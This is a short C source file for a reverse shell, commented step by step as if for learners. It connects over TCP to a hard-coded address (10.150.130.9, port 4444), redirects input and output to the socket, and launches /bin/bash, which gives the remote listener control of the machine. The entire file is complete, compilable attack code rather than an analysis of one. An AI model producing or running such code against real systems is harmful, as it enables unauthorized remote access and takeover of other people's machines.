// Default port used: 4444
//Simple ReverseShell
// Compilation Instructions: gcc reverseShell.c -o reverseShell
#include <stdio.h> // Input and output
#include <stdlib.h>
#include <sys/socket.h> // Sockets
#include <sys/types.h> // Definitions and data types for sysCalls
#include <unistd.h> 
#include <netinet/in.h> // Constants and Structures for INET Domain Adresses
#include <arpa/inet.h>  // IP's


int main(void)
{
	int sock_used; // socket
	int port = 4444; // Port the RS is gonna use to listen
	struct sockaddr_in reverseSockAdd;

	sock_used = socket(AF_INET, SOCK_STREAM,0); //Creation of the Socket EndPoint for connection
											 // AF_INET to specify and IPv4 connection
						                       //Sock_STREAM used to speciy a two way connection
						                      // 0 for the protocol (TCP or UDP)
	reverseSockAdd.sin_family = AF_INET; /*Used to specify what protocol you are using*/
	reverseSockAdd.sin_port = htons(port);/*Specify the port we gonna use*/
											//The portNumber has to be converted to a NetworkByte
	reverseSockAdd.sin_addr.s_addr = inet_addr("10.150.130.9"); // Specify the targeted IP adress
	
	connect(sock_used, (struct sockaddr *) &reverseSockAdd,
	sizeof(reverseSockAdd)); // Used in conjonction with the socket to connect
			                // Connect to the Socket using the Structure
	/*We now going use the dup2 function to create a copy of the file descriptor*/
	/*We are going to use it for the input and output */

	dup2(sock_used,0); /*You have the old file descriptor and then the new one*/
	dup2(sock_used, 1);
	dup2(sock_used, 2);

	// creation of a constant 
	char * const argv[] = {"/bin/bash", NULL};
	execve("/bin/bash", argv,NULL); //SysCall

	return 0;
}
